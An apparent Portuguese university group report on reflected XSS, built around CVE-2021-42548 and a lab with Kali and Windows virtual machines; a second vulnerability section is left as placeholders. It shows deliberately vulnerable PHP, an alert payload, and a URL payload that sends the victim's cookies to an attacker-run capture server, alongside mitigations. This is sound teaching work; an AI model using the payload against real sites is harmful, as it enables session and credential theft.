# Trabalho de Grupo de Cibersegurança
## Engenharia de Sistemas e Tecnologias Informáticas

---

## Introdução

Este relatório tem como objetivo identificar, percecionar, prevenir e mitigar vulnerabilidades que podem ser detetadas em redes informáticas, sistemas, gestão de identificação, aplicações web, aplicações em si e vulnerabilidades de integridade de dados.

Para este trabalho, foram selecionadas duas vulnerabilidades críticas para análise aprofundada:

1. **Reflected XSS na funcionalidade de pesquisa do WordPress - WP Cloud Plugins Share-OneDrive (CVE-2021-42548)** 

As vulnerabilidades XSS (Cross-Site Scripting) representam uma das maiores ameaças em aplicações web, permitindo que atacantes injetem código malicioso que é executado no navegador das vítimas. O XSS não visa diretamente servidores ou hosts, mas sim os clientes que utilizam esses servidores, tornando-o particularmente perigoso em ambientes com múltiplos utilizadores.

2. **[Segunda Vulnerabilidade - A Definir]**



### Metodologias de Deteção Utilizadas

Para a identificação e análise destas vulnerabilidades, foram utilizadas as seguintes metodologias:

- **Análise de CVE (Common Vulnerabilities and Exposures)**: Pesquisa em bases de dados públicas de vulnerabilidades, nomeadamente no site NVD (National Vulnerability Database), cortesia do Instituto Nacional de Padrões e Tecnologia do EUA.

- **Testes de Penetração**: Simulação de ataques XSS em ambientes controlados.

- **Análise de Código-Fonte**: Revisão do código para identificar falhas de validação e sanitização de entradas
- **Ferramentas Automatizadas**: Utilização de scanners de vulnerabilidades web
- **Testes Manuais**: Injeção de cargas úteis XSS personalizadas para confirmar a exploração

---

## Vulnerabilidade 1: Reflected XSS no WordPress WP Cloud Plugins Share-OneDrive

### Apresentação da Vulnerabilidade

**Identificação:**
- **CVE ID**: CVE-2021-42548
- **Plugin Afetado**: WP Cloud Plugins Share-OneDrive
- **Versões Vulneráveis**: Versões anteriores à correção
- **Plataforma**: WordPress
- **Tipo de Vulnerabilidade**: Reflected Cross-Site Scripting (XSS)
- **Severidade**: Média a Alta

**Sistemas Afetados:**

Esta vulnerabilidade afeta qualquer site WordPress que utilize o plugin WP Cloud Plugins Share-OneDrive nas versões vulneráveis. O plugin é utilizado para integração com o Microsoft OneDrive, permitindo partilhar e gerir ficheiros diretamente através do WordPress.

****

**Ações, Objetivos e Resultados de Exploração:**

Analisando a descrição do CVE (Common Vulnerabilities and Exposures), percebemos que esta vulnerabilidade se tratava da capacidade de utilizadores inautenticados conseguirem fazerem ataques de Reflected Cross-Side Scripting, também conhecido como Reflected XSS.

O Reflected XSS permite que um atacante execute código JavaScript malicioso nos Web-Browsers  de utilizadores legítimos através de URLs manipulados. Os objectivos típicos incluem:

- **Roubo de Credenciais**: Captura de cookies de sessão e tokens de autenticação
- **Phishing**: Apresentação de formulários falsos para roubo de dados
- **Redirecionamento Malicioso**: Envio de utilizadores para sites maliciosos
- **Manipulação de Conteúdo**: Alteração do conteúdo apresentado ao utilizador
- **Propagação de Malware**: Distribuição de código malicioso através de downloads automáticos

Quando explorada com sucesso, esta vulnerabilidade permite:

1. Execução de código JavaScript arbitrário no contexto do site WordPress
2. Acesso a informações sensíveis do utilizador, incluindo cookies e dados de sessão
3. Realização de ações em nome do utilizador autenticado
4. Comprometimento da confiança dos utilizadores no site
5. Possível escalada para ataques mais sofisticados, como BeEF (Browser Exploitation Framework)

### Exploração da Vulnerabilidade

Para explorar esta vulnerabilidade, temos duas máquinas virtuais diferentes a rodar no Oracle Virtual Box, de forma a replicar sistemas operativos:

- Kali Linux: - a <span style="color:red">  máquina atacante</span>.
- Windows 11: - a <span style="color:teal"> máquina vitima</span>.

#### 1º Cenário - Simples

Neste, cenário temos a máquina Kali Linux a hospedar um website simples (share-one-drive.php) com uma caixa de texto, que neste caso permite executar código JavaScript. Ora vejamos:

A primeira coisa a entender é o IP de cada máquina:

![image info](./imagens/1.png)

- IP da Kali Linux: - a <span style="color:red">  10.0.2.15 </span>
- IP da Windows 11: - a <span style="color:teal"> 10.0.2.3 </span>

Eis a composição do site "share-one-drive.php":

![image info](./imagens/3.png)


Executando o servidor Apache na máquina Kali Linux, com o comando **"sudo service apache2 start"**, a máquina Windows consegue aceder ao tal website através do seu IP + /caminho_para_site:

![image info](./imagens/2.png)

O objetivo deste site aparente ser simplesmente imprimir o texto que foi escrito na caixa de texto "Procurar".

No entanto, a vulnerabilidade reside na linha `echo "Você procurou por: " . $_GET['s'];`.
Quando o utilizador insere um texto normal (e.g. "teste"), o output é seguro:

![image info](./imagens/4.png)

Mas quando se insere um código, (e.g. `<script>alert(1)</script>`) o output gerado é:

![image info](./imagens/5.png)

Esta é a essência do Reflected XSS; O facto de ter aberto uma janela pop up (alert em Javascript) a mostrar um texto é uma representação bastante simplificada de Reflected XSS -  um script malicioso é injetado através de um request do utilizador e é "refletido" de volta na resposta do servidor, executando-se no navegador da vítima. 

Para mitigar a vulnerabilidade neste cenário, alterávamos a linha de código indentificada para:

`echo "Você procurou por: "` **`htmlspecialchars($_GET['s'])`**`;`

Neste caso, foi apenas um alerta, mas vejamos outros cenários mais preocupantes.

#### 2º Cenário - Roubo de Credenciais através de Cookies

Neste cenário, a máquina Kali Linux hospeda um sistema de login vulnerável (login.html e dashboard.php) que armazena credenciais de forma insegura em forma de cookies. O objetivo é demonstrar como um atacante pode utilizar Reflected XSS para roubar sessões completas de utilizadores, incluindo usernames e passwords.

##### Composição dos Ficheiros Vulneráveis

**Ficheiro login.html:**

![image info](./imagens/8.png)

![image info](./imagens/9.png)

![image info](./imagens/11.png)


O utilizador entraria neste website, preenche as credencias de login e posteriormente é levado para outra página (dashboard.php).

Após o login bem-sucedido, o sistema cria vários cookies, incluindo os perigosos cookies com as credenciais

O problema é o facto de os dados serem guardados em forma de cookies - ficheiros de texto usados pela Internet para guardar info qualquer tipo de informação.

![image info](./imagens/12.png)

Abrindo o DevTools do WebBrowser (tipicamente clicando na tecla F12), conseguimos ver a informação guardada em forma de cookie. Passwords normalmente não são guardadas como cookies devido à sensibilidade do tipo de informação, mas preferências de utilizador, outros dados de sessão e autenticação, informação de formulários, entre outros dados tipicamente são guardados como cookies.

Esta informação é recolhida e vendida bastantes vezes, sendo que empresas de anúncios frequentemente obtém estes dados de forma a melhorar o seus negocios. 

Vejamos a implicação de guardar informação em forma de cookie no contexto de Reflected XSS.

**Estrutura HTML do ficheiro dahsboard.php:**

![image info](./imagens/14.png)

**Estrutura PHP do ficheiro dahsboard.php (secção crítica):**

![image info](./imagens/13.png)

A vulnerabilidade crítica reside na prática extremamente insegura:

1. **Armazenamento de passwords em cookies** (linhas onde se cria o cookie `user_password`):
```php
   setcookie("user_password", $password, time() + 3600, "/");
```

##### Execução do Ataque

**Passo 1: Iniciar o Servidor Apache e o Servidor de Captura**

Na máquina Kali Linux, executamos o seguinte comando:

```bash
python3 -m http.server 8000
```

O servidor Python (porta 8000) será usado para capturar os cookies roubados.


**Passo 2: Construção do Payload Malicioso**

```
http://10.0.2.15/dashboard.php?s=%3Cscript%3Ewindow.location%3D%27http%3A%2F%2F10.0.2.15%3A8000%2F%3Fcookie%3D%27%2Bdocument.cookie%3C%2Fscript%3E
```

Este payload faz com que o navegador da vítima execute JavaScript que:
1. Captura todos os cookies da sessão (`document.cookie`)
2. Redireciona para o servidor do atacante enviando os cookies como parâmetro

**Passo 3: Envio do Link Malicioso**

O atacante envia este link para a vítima através de engenharia social (email, mensagem, etc.). Quando a vítima clica no link, o servidor Python na máquina Kali Linux recebe um pedido GET contendo TODOS os cookies:

![image info](./imagens/15.png)


O atacante agora possui:
- **Username**: NOVO-UTILIZADOR (cookie `usuario_logado`)
- **Password**: NOVA-PASSWORD (cookie `user_password`)
- **Token de sessão**: (cookie `session_token`)
- **Session ID**: (cookie `PHPSESSID`)

##### Gravidade da Vulnerabilidade

Este cenário demonstra uma vulnerabilidade de **severidade crítica** que combina:

1. **Reflected XSS**: Permite execução de código JavaScript arbitrário
2. **Armazenamento inseguro de credenciais**: Passwords guardadas em texto plano em cookies
3. **Falta de proteção HTTPOnly**: Cookies acessíveis via JavaScript
4. **Falta de proteção Secure**: Cookies transmitidos sem HTTPS

Com estas informações, o atacante pode:
- Fazer login como a vítima em qualquer momento
- Aceder a todas as funcionalidades da conta
- Modificar dados do utilizador
- Realizar ações em nome da vítima

##### Mitigação das Vulnerabilidades

Para corrigir estas vulnerabilidades, seria necessário implementar várias camadas de segurança:

**1. Sanitização do Input (Correção do XSS):**
```php
echo htmlspecialchars($search_param, ENT_QUOTES, 'UTF-8');
```

**2. NUNCA armazenar passwords em cookies:**
```php
// REMOVER completamente estas linhas:
// setcookie("user_password", $password, time() + 3600, "/");
// setcookie("remember_password", $password, time() + (86400 * 30), "/");
```

**3. Usar hashing de passwords:**
```php
$hashed_password = password_hash($password, PASSWORD_DEFAULT);
// Armazenar apenas o hash na base de dados, NUNCA a password original
```

**4. Implementar flags de segurança nos cookies:**
```php
setcookie("session_token", $token, [
    'expires' => time() + 3600,
    'path' => '/',
    'secure' => true,      // Apenas HTTPS
    'httponly' => true,    // Não acessível via JavaScript
    'samesite' => 'Strict' // Proteção CSRF
]);
```

**5. Implementar Content Security Policy (CSP):**
```php
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
```

**6. Validação server-side:**
```php
if (!preg_match('/^[a-zA-Z0-9_]+$/', $username)) {
    die("Username inválido");
}
```

## Vulnerabilidade 2: [A Definir]

### Apresentação da Vulnerabilidade

**Identificação:**
- **CVE ID**: [A completar]
- **Sistema/Aplicação Afetada**: [A completar]
- **Versões Vulneráveis**: [A completar]
- **Tipo de Vulnerabilidade**: [A completar]
- **Severidade**: [A completar]

**Sistemas Afetados:**

[Descrição dos sistemas afetados - A completar]

**Ações e Objetivos:**

[Descrição das ações possíveis e objetivos do atacante - A completar]

**Resultados de Exploração:**

[Descrição dos resultados quando a vulnerabilidade é explorada - A completar]

### Exploração da Vulnerabilidade

**Como Atua a Vulnerabilidade:**

[Explicação detalhada do funcionamento - A completar]

**Como Explorar a Vulnerabilidade:**

[Passos detalhados de exploração - A completar]

### Mitigação da Vulnerabilidade

**Medidas de Proteção:**

[Medidas de mitigação e proteção - A completar]

---

## Conclusões

### Enquadramento com a Aprendizagem da UC

Este trabalho permitiu aplicar na prática os conceitos teóricos sobre vulnerabilidades XSS, nomeadamente:

**Conhecimentos Aplicados sobre XSS:**

1. **Compreensão dos Tipos de XSS**: Existem principalmente três tipos de XSS - Reflected, Stored e DOM-based. Neste trabalho, analisámos em profundidade o Reflected XSS, que não armazena a carga útil no servidor mas requer que a vítima clique numa ligação manipulada.

2. **Metodologias de Teste**: Aplicámos técnicas práticas de teste de vulnerabilidades, incluindo:
   - Testes básicos com `<script>alert()</script>`
   - Técnicas de contorno usando maiúsculas/minúsculas
   - Inspecção de código-fonte para identificar contextos de injeção
   - Manipulação de elementos HTML através de ferramentas de desenvolvimento

3. **Análise de Filtros e Sanitização**: Compreendemos como diferentes níveis de segurança implementam filtros distintos, e como técnicas de evasão podem contornar protecções inadequadas.

4. **Impacto Real**: Reconhecemos que XSS não é apenas uma vulnerabilidade teórica - tem impacto real em utilizadores finais, permitindo roubo de credenciais, sessões e dados sensíveis.

### O Que Depreendemos das Vulnerabilidades

**Lições Principais:**

1. **Validação de Entrada é Crítica**: A maioria das vulnerabilidades XSS resulta de falha em validar e sanitizar adequadamente entradas do utilizador. Nunca devemos confiar em dados provenientes do cliente.

2. **Defesa em Profundidade**: Uma única camada de protecção não é suficiente. É necessário implementar múltiplas camadas: validação de entrada, codificação de saída, CSP, WAF, cookies seguros, etc.

3. **Actualizações São Essenciais**: O CVE-2021-42548 demonstra como vulnerabilidades em plugins de terceiros podem comprometer toda a segurança de um site. Manter sistemas actualizados é fundamental.

4. **Contexto Importa**: A mesma técnica de mitigação não funciona em todos os contextos. É necessário entender onde a entrada é reflectida (HTML, JavaScript, atributos, JSON) para aplicar a protecção adequada.

5. **Educação e Consciencialização**: Aspectos técnicos são importantes, mas a educação dos utilizadores para não clicarem em ligações suspeitas é igualmente crucial na prevenção de ataques XSS reflectidos.

6. **Impacto nos Utilizadores Finais**: XSS tem consequências reais - roubo de identidade, perda de dados, comprometimento de contas. Como profissionais de cibersegurança, temos responsabilidade em proteger os utilizadores.

### Reflexão Final

A análise destas vulnerabilidades reforçou a importância de uma abordagem proativa à segurança. Não basta corrigir vulnerabilidades após serem descobertas - é necessário incorporar segurança desde o design (Security by Design) e realizar auditorias regulares.

O estudo do CVE-2021-42548 demonstrou como vulnerabilidades em componentes de terceiros (plugins WordPress) podem afetar drasticamente a segurança de toda a aplicação. Isto sublinha a necessidade de due diligence ao escolher dependências externas e de manter um inventário atualizado de todos os componentes utilizados.

Finalmente, este trabalho evidenciou que cibersegurança é um campo em constante evolução, requerendo aprendizagem contínua e adaptação a novas ameaças e técnicas de ataque.

---

**Relatório desnenvolvido por:**
- 
- Lucas Machadinho Martins - 79294 - a79294@ualg.pt
- Pedro Daniel Gonçalves - 79297 - a79297@ualg.pt
- Guilherme Coelho Simões - 74535 - a74535@ualg.pt

**Data** 
- 
9 de dezembro, 2025

**Unidade Curricular:** 
-
Cibersegurança - Licenciatura em Engenharia de Sistemas e Tecnologias Informáticas

**Docente Responsável da Unidade Curricuar:**
-
 Joel David Valente Guerreiro